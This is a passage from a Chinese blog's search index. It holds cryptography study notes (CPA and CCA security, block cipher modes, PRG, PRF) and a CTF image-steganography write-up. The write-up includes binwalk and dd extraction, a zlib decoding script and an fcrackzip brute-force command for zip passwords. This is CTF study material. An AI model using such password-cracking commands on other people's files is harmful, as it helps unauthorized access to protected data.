    <content type="html"><![CDATA[<h1 id="密码学知识（三）"><a href="#密码学知识（三）" class="headerlink" title="密码学知识（三）"></a>密码学知识（三）</h1><h4 id="1-CPA—Security（选择明文攻击实验）"><a href="#1-CPA—Security（选择明文攻击实验）" class="headerlink" title="1.CPA—Security（选择明文攻击实验）"></a>1.CPA—Security（选择明文攻击实验）</h4><p>&emsp;&emsp;由于语义安全模型的局限性：只考虑了攻击者询问一次挑战者的情况，而没有考虑多次询问的情况。为此，提出了新的安全模型CPA模型，以讨论多次询问挑战者时的安全性问题。</p><p>&emsp;&emsp;在CPA安全中，攻击者可以发动选择明文攻击，攻击的目的是区分挑战者返回的密文包含的到底是那个明文。CPA安全性的定义与语义安全性定义类似，只不过，CPA安全模型中允许攻击者多次询问挑战者</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%89%EF%BC%89/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;（CPA的单消息安全代表多消息安全）</p><p>&emsp;</p><h4 id="2-证明题二：if-F-is-PRF-then-Π-is-cpa-secure"><a href="#2-证明题二：if-F-is-PRF-then-Π-is-cpa-secure" class="headerlink" title="2.证明题二：if F is PRF,then Π is cpa-secure"></a>2.证明题二：if F is PRF,then Π is cpa-secure</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%89%EF%BC%89/2.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-分组密码的操作模式"><a href="#3-分组密码的操作模式" class="headerlink" title="3.分组密码的操作模式"></a>3.分组密码的操作模式</h4><p>&emsp;&emsp; ①ECB（电子密码本模式）</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%89%EF%BC%89/3.png" style="zoom:80%;" /></center><p>&emsp;&emsp;该操作模式中不涉及到随机数的使用。是一种最简易的工作方式，在相同密钥作用下，相同的密文加密后将产生相同的密文，易于暴露明文的固有格式；并且个密文块之间缺乏相关性，信息容易受到块替换攻击。</p><p>&emsp;&emsp;②CBC模式（密码分组链接模式）</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%89%EF%BC%89/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;该操作模型中涉及到随机数的使用，并且其中Fk要求可逆，密文才能反译为明文。可以通过过程图看出，CBC能够隐蔽明文的数据模式，相同的明文对应的密文一般不同。但是如果信道噪音等干扰带来了密文传输的错误时，密文的任何一个错误都会影响当前分组以及下一组的解密</p><p>&emsp;&emsp;statefull CBC：</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%89%EF%BC%89/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;该优点是不用重选随机数，节省带宽，还节约计算机资源。缺点是不太安全。</p><p>&emsp;&emsp; ③OFB模型（输出反馈模式）</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%89%EF%BC%89/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;该操作模型中涉及到随机数，并且其中Fk不要求可逆，密文也能反译为明文。相对应的stateful OFB是安全的。OFB模式具有普通序列密码的优缺点，如可加密任意长度的数据（即不需要进行分组填充），没有错误传播，适于加密冗余度较大的数据、语音和图像数据，但对密文的篡改难以检测。</p><p>&emsp;&emsp;④CTR模型（计数器模式）</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%89%EF%BC%89/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;充分的使用了并行运算。相对应的stateful CTR是安全的。</p><p> &emsp;&emsp;⑤CFB模型（密码反馈模式）——》这玩意没讲</p><p>&emsp;</p><h4 id="4-CCA—Security（选择密文攻击实验）"><a href="#4-CCA—Security（选择密文攻击实验）" class="headerlink" title="4.CCA—Security（选择密文攻击实验）"></a>4.CCA—Security（选择密文攻击实验）</h4><p>&emsp;&emsp;在上面我们介绍了CPA安全，CPA安全作为选择明文攻击，考虑到了多次询问明文给予密文的情况，但是依旧存在一种攻击，它能够在多次询问明文给予密文的情况下，同时多次询问密文基于明文，这就就是所谓的CCA攻击，也就是选择密文攻击。</p><p>&emsp;&emsp;在CCA安全中，攻击者可以发动选择密文攻击，攻击的目的是区分挑战者返回的密文包含的到底是那个明文。</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%89%EF%BC%89/8.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="5-后续"><a href="#5-后续" class="headerlink" title="5.后续"></a>5.后续</h4><p>&emsp;&emsp;后面的笔记还有MAC（消息认证模型）、证明题三：if F is PRF,then Π is euf-cma-secure等内容，由于部分关系，这里来不及载入，后续将直接放考试复习的内容了（后续的部分笔记写得太乱了，东一坨，西一坨，也就我自己能看懂顺序）</p>]]></content>
    
    
    <categories>
      
      <category>密码学笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学知识（二）</title>
    <link href="/2021/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="密码学知识（二）"><a href="#密码学知识（二）" class="headerlink" title="密码学知识（二）"></a>密码学知识（二）</h1><h4 id="1-PRG的安全性定义"><a href="#1-PRG的安全性定义" class="headerlink" title="1.PRG的安全性定义"></a>1.PRG的安全性定义</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;由于无法达到真正的随机，只能通过人为的算法无限逼近随机，所以伪随机算法诞生。只要无限逼近这个极限，就认为是一个随机产生的序列。</p><p>&emsp;&emsp;用通俗的话解释，PRG模型其实就是一个将短的比特串变成长比特串的过程，这个变换的过程我们并不关心。</p><p>&emsp;</p><h4 id="2-PRG的安全模型"><a href="#2-PRG的安全模型" class="headerlink" title="2.PRG的安全模型"></a>2.PRG的安全模型</h4><p>&emsp;&emsp;首先设 G: {0,1}s → {0,1}n 是一个PRG。下面给出PRG的安全模型：</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;设A是一个攻击者，用一个红色小怪物来表示。构造两个“小黑屋”，也即黑盒子（black box），每个屋里各有一个挑战者（challenger）：</p><ol><li><p>一个挑战者执行G，随机选择种子k，并将G（k）的执行结果返回给A。</p></li><li><p>另一个 挑战者随机选择r，并将之直接返回给A。</p></li><li><p>随机选择一个小黑屋，放到A的面前，A并不知道自己面对的是哪一个小黑屋：</p><p>如果A面对的是PRG的小黑屋，我们称实验为EXP(0)。</p><p>如果A面对的是随机序列的小黑屋，我们称为EXP(1)。 </p></li><li><p>A根据r猜测自己面对的是哪个小黑屋，并输出自己的猜测b。</p></li></ol><p>&emsp;</p><h4 id="3-EAV-Security（多消息窃听实验）"><a href="#3-EAV-Security（多消息窃听实验）" class="headerlink" title="3.EAV-Security（多消息窃听实验）"></a>3.EAV-Security（多消息窃听实验）</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/3.png" style="zoom:80%;" /></center><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;Privk（交互机模型）</p><p>&emsp;&emsp;EAV的单消息安全并不代表多消息安全</p><p>&emsp;</p><h4 id="4-证明题一：if-G-is-PRG-then-Π-is-eav—secure"><a href="#4-证明题一：if-G-is-PRG-then-Π-is-eav—secure" class="headerlink" title="4.证明题一：if G is PRG,then Π is eav—secure"></a>4.证明题一：if G is PRG,then Π is eav—secure</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;PPT:概率时间多项式时间算法</p><p>&emsp;</p><h4 id="5-加密方案的攻击类型"><a href="#5-加密方案的攻击类型" class="headerlink" title="5.加密方案的攻击类型"></a>5.加密方案的攻击类型</h4><ol><li>唯密文攻击：攻击者只知道一些密文</li><li>已知明文攻击：攻击者除了知道一些密文以外，还可以通过某些手段知道这些密文对应的明文。</li><li>选择明文攻击（CPA）：攻击者自己选择一些明文，并可以通过某些手段获得相应的密文。</li><li>选择密文攻击（CAA）：攻击者自己选择一些密文，并可以通过某些手段获得相应的明文。</li></ol><p>&emsp;</p><h4 id="6-语义安全性"><a href="#6-语义安全性" class="headerlink" title="6.语义安全性"></a>6.语义安全性</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/6.png" style="zoom:80%;" /></center><ol><li>挑战者会从密钥空间K中随机选择一个密钥k，并对攻击者A发送的两个明文中的其中一个就行加密，在实验EXP(0)中，挑战者加密的是明文m0，而在实验EXP(1)中加密的是m1。</li><li>A根据获得的密文c猜测自己是处于哪个实验中，并输出自己的猜测，记为b。</li><li>A只能给挑战者发送一次明文，也即只允许A询问一次，换句话说，挑战者选择的密钥只使用一次。</li></ol><p>&emsp;&emsp;以此安全模型为基础，定义语义安全：</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;利用定义得出语义安全性的公式表达：</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/8.png" style="zoom:80%;" /></center><p>&emsp;&emsp;本质：如果加密算法是语义安全的，则m0和m1的密文计算上是不可区分的。</p><p>&emsp;</p><h4 id="7-分组密码的定义"><a href="#7-分组密码的定义" class="headerlink" title="7.分组密码的定义"></a>7.分组密码的定义</h4><p>&emsp;&emsp;PRF：Pseudorandom Functions 伪随机函数:</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/9.png" style="zoom:80%;" /></center><p>&emsp;&emsp;随机函数（即是定义在一堆规则的函数中随机挑选一个函数）：</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/10.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-PRF的安全模型"><a href="#8-PRF的安全模型" class="headerlink" title="8.PRF的安全模型"></a>8.PRF的安全模型</h4><p>&emsp;&emsp;根据随机函数的概念，定义PRF的安全性：</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/11.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在PRF的安全模型中，同样考虑两个挑战者，每个挑战者都控制着一个函数f</p><p>&emsp;&emsp;第一个挑战者的函数为f := F (k, .)；i（真随机对应函数）。</p><p>&emsp;&emsp;第二个挑战者则是从随机函数Funs[X,Y]中随机选择一个函数。</p><p>&emsp;&emsp;攻击者 A 不知道自己面对的挑战者到底是哪一个，但他可以通过“探测”的方法来帮助判断。A 的最终目标就是要猜出自己面对的到底是哪一个挑战者。</p><p>&emsp;&emsp;探测的方法是这样的：A 可以向挑战者发送一个元素 x_i∈X，挑战者将相应的 y_i:= f(x_i) 返回给 A。</p><p>&emsp;&emsp;A 可以进行这样的探测很多次。</p><p>&emsp;&emsp;当然，A 可以根据前一次探测得到的y_i来产生下一次探测时使用的x_{i+1}，以根据它们之间的关系来判断到底挑战者是哪一个，也即面前的挑战者控制的函数到底是哪一种类型：使用随机密钥的 PRF，还是随机函数。</p><p>&emsp;&emsp;定义 (安全的 PRF)：如果所有高效的攻击者的优势都是可忽略的，那么该 PRF 是安全的。</p><p>&emsp;</p><h4 id="9-PRP的安全定义"><a href="#9-PRP的安全定义" class="headerlink" title="9.PRP的安全定义"></a>9.PRP的安全定义</h4><p>&emsp;&emsp;一个分组密码其实也可以被称之为伪随机置换（PRP），因为分组密码和PRF的定义及安全模型是非常类似的，分组密码的安全性要求其与随机置换在计算上不可区分。</p><p>&emsp;&emsp;通过定义可以知道，PRF 和 PRP（分组密码）之间最主要的区别就是，PRP 是有逆函数的，而 PRF 未必有逆函数。</p><p>&emsp;&emsp;（本质就是X和Y都是相同的区域空间，相互映射）</p>]]></content>
    
    
    <categories>
      
      <category>密码学笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学知识（一）</title>
    <link href="/2021/12/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/12/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="密码学知识（一）"><a href="#密码学知识（一）" class="headerlink" title="密码学知识（一）"></a>密码学知识（一）</h1><h4 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h4><p>&emsp;&emsp;E是加密算法 D是解密算法 </p><p>&emsp;&emsp;m是明文（要发的消息） c是密文（收到的消息） </p><p>&emsp;&emsp;k是密钥（通信双方使用的相同就是对称加密也就是私钥，不同就是非对称加密也就是公钥）</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/1.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-Kerckhoffs’-principle（柯克霍夫原则）"><a href="#2-Kerckhoffs’-principle（柯克霍夫原则）" class="headerlink" title="2.Kerckhoffs’ principle（柯克霍夫原则）"></a>2.Kerckhoffs’ principle（柯克霍夫原则）</h4><p>内容：</p><p>&emsp;&emsp;加密方案应该设计成只要敌手不知道使用的密钥，即使知道了方案的组成细节，方案依旧是安全的，即安全性仅依靠于密钥的安全性。</p><p>原因：</p><ol><li><p>（对短密钥保密vs对算法保密）</p><p>与维护算法的保密性相比，通信各方更容易维护短小密钥的保密性。</p></li><li><p>（改变密钥vs改变加密方案）</p><p> 万一密钥暴露了，相比于替换整个算法。参与方更容易改变的密钥。</p></li><li><p>（密码的商业化和标准化）</p></li></ol><p>&emsp;&emsp;万一有多对人员需要加密他们的通信，对所有参与方而言，相比使用不同的程序或算法，使用相同的程序及不同的密钥要容易得多，也就是说，保证了这个加密算法更容易商业化和标准化。</p><p>&emsp;&emsp;</p><h4 id="3-完善保密性"><a href="#3-完善保密性" class="headerlink" title="3.完善保密性"></a>3.完善保密性</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;本质：当攻击者得到一个密文后，是无法判断密文是来自于明文中的哪一个，因为这个密文来自于每一个明文的概率是一样的。这样子的对称加密方案是完善保密的。</p><p>&emsp;&emsp;前提条件： 攻击者只能窃听到密文且拥有无限的计算资源。</p><p>&emsp;&emsp;</p><h4 id="4-评价体系安全性"><a href="#4-评价体系安全性" class="headerlink" title="4.评价体系安全性"></a>4.评价体系安全性</h4><ol><li>计算安全性：从计算量上衡量密码体系的安全性</li><li>可证明安全性：通常用归纳的方式证明所定义的安全性</li><li>无条件安全：即使计算资源无限，也无法攻破</li></ol><p>&emsp;</p><h4 id="5-一次一密（比特串形式）："><a href="#5-一次一密（比特串形式）：" class="headerlink" title="5.一次一密（比特串形式）："></a>5.一次一密（比特串形式）：</h4><p>&emsp;&emsp;限制：要求明文、密文和密钥都是长度相等的比特串（密钥的长度可以比明文和密文长）。</p><p>&emsp;&emsp;加密时，明文和密钥逐一比特异或即得密文。</p><p>&emsp;&emsp;解密时，密文和密钥逐一比特异或即得明文。</p><p>&emsp;</p><h4 id="6-香农定理"><a href="#6-香农定理" class="headerlink" title="6.香农定理"></a>6.香农定理</h4><p>&emsp;&emsp;定理：设（E, D）是定义在（K, M, C）上的对称加密体制，如果它是完善保密的，则 |K|≥|M|。 </p><p>&emsp;&emsp;缺点：如果一个加密体制具有完善保密性，那么密钥的数量至少要明文的数量一样多长密钥再和明文异或得到密文。这样子保留了一次一密加解密简单高效的优点，又克服了需要直接使用长密钥带来的不实用性。</p><p>&emsp;&emsp;如果一个序列能够和等长的随机序列不可区分的话，那么它就是伪随机序列。相当于说，伪随机序列能以假乱真，和真正随机的序列区分不开。</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/3.png" style="zoom:80%;" /></center><p>&emsp;&emsp; PRG的输入长度s远远小于其输出长度n。其输入我们称之为 种子（seed），并称 {0,1}^s 为种子空间。 </p><p>&emsp;</p><h4 id="7-流密码（就是使用了PRG解决了一定要长度相等的条件）"><a href="#7-流密码（就是使用了PRG解决了一定要长度相等的条件）" class="headerlink" title="7.流密码（就是使用了PRG解决了一定要长度相等的条件）"></a>7.流密码（就是使用了PRG解决了一定要长度相等的条件）</h4><p>&emsp;&emsp;我们设G是一个RPG，改造后的一次一密就长下面这样：</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;很明显，这里使用RPG的输出G(k)代替原来的密钥，我们将这种改造后的一次一密称为流密码。其实PRG的作用就是将原本规定必须很长的密钥变为比较小的密钥。</p>]]></content>
    
    
    <categories>
      
      <category>密码学笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Misc——图片隐写</title>
    <link href="/2021/11/07/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <url>/2021/11/07/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc——图片隐写"><a href="#Misc——图片隐写" class="headerlink" title="Misc——图片隐写"></a>Misc——图片隐写</h1><p>（并非全部情况，这里仅讲述自己在玩Misc板块题目时遇到的，也算是提供一些思路）</p><h4 id="情况1：打开图片即得flag"><a href="#情况1：打开图片即得flag" class="headerlink" title="情况1：打开图片即得flag"></a>情况1：打开图片即得flag</h4><h4 id="情况2：改变后缀获得flag"><a href="#情况2：改变后缀获得flag" class="headerlink" title="情况2：改变后缀获得flag"></a>情况2：改变后缀获得flag</h4><p>&emsp;&emsp;使用对应软件获悉是个png图片，改为png后缀打开获得flag</p><h4 id="情况3：图片里的信息附加"><a href="#情况3：图片里的信息附加" class="headerlink" title="情况3：图片里的信息附加"></a>情况3：图片里的信息附加</h4><p>&emsp;&emsp;使用winhex打开对应文件、在文件对应的进制当中存在flag</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1.png" style="zoom:67%;" /></center><h4 id="情况4：图片里的隐藏文件"><a href="#情况4：图片里的隐藏文件" class="headerlink" title="情况4：图片里的隐藏文件"></a>情况4：图片里的隐藏文件</h4><p>&emsp;&emsp;使用linux里面的binwalk、foremost命令，从而找出文件中的隐藏文件，从而找到flag</p><p><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/2.png"></p><p>&emsp;&emsp;使用binwalk发现在png下面藏zip文件，使用dd分离出zip文件  </p><p><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/3.png"></p><p>&emsp;&emsp;skip=471、count=650是对应参数，bs表示设置文件的大小为多少MB，得到提示是4位数的密码压缩包 。</p><p>&emsp;&emsp;用kali的 fcrackzip进行解压，命令格式现在我们使用命令 fcrackzip -b -c ‘1’ -l 1-6 -u test.zip ，-b(使用暴力破解方式)，-c‘1’（密码中只有数字），-l（密码长度为1-6）， -u（目标名称）。我们通过暴力破解成功获得了压缩包密码。</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/4.png" style="zoom:67%;" /></center><h4 id="情况5：图片问题内容提示"><a href="#情况5：图片问题内容提示" class="headerlink" title="情况5：图片问题内容提示"></a>情况5：图片问题内容提示</h4><p>&emsp;&emsp;首先打开会有短的idat块显示有异常：</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/5.png" style="zoom:67%;" /></center><p>&emsp;&emsp;接着直接使用idat合成另外一组图片，使用zlib脚本进行压缩</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import zlib<br>import binascii<br><br>IDAT=<span class="hljs-string">&quot;789C4B2E492BCEC82FAF363635363235323132494C36B34C4E3233493333313637B3B030354C4C36B734A8050009960BD1&quot;</span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><br>result=binascii<span class="hljs-selector-class">.hexlify</span>(zlib<span class="hljs-selector-class">.decompress</span>(IDAT))<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result)</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/6.png"></p><p>&emsp;&emsp;16进制转一下即可得到flag</p><h4 id="情况6：图片问题内容提示-idat删除情况"><a href="#情况6：图片问题内容提示-idat删除情况" class="headerlink" title="情况6：图片问题内容提示(idat删除情况)"></a>情况6：图片问题内容提示(idat删除情况)</h4><p>&emsp;&emsp;有删除第一个idat即可得到flag：</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/7.png" style="zoom: 40%;" /></center><p>&emsp;&emsp;有删除前八个idat即可得到flag：</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/8.png" style="zoom: 35%;" /></center><h4 id="情况7-图片隐藏在64位程序中"><a href="#情况7-图片隐藏在64位程序中" class="headerlink" title="情况7: 图片隐藏在64位程序中"></a>情况7: 图片隐藏在64位程序中</h4><p>&emsp;&emsp;发送了exe程序，但是打不开，使用winhex查看  </p><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/9.png" style="zoom:80%;" /><p>&emsp;&emsp;提示 jpg 和base64，使用base解码</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/10.png" style="zoom:50%;" /></center><p>&emsp;&emsp;解码发现为png文件，打开为二维码</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/11.png"/></center><p>&emsp;&emsp;最后扫描二维码得到答案</p>]]></content>
    
    
    <categories>
      
      <category>CTF-Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Misc类型导图</title>
    <link href="/2021/10/30/Misc%E7%B1%BB%E5%9E%8B%E5%AF%BC%E5%9B%BE/"/>
    <url>/2021/10/30/Misc%E7%B1%BB%E5%9E%8B%E5%AF%BC%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc类型导图"><a href="#Misc类型导图" class="headerlink" title="Misc类型导图"></a>Misc类型导图</h1><p>&emsp;&emsp;闲来无事突然对Misc的一些板块感兴趣，挺有意思的，抽空看看吧。</p><center><img src="/img/Misc%E7%B1%BB%E5%9E%8B%E5%AF%BC%E5%9B%BE/1.png" /></center>]]></content>
    
    
    <categories>
      
      <category>CTF-Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
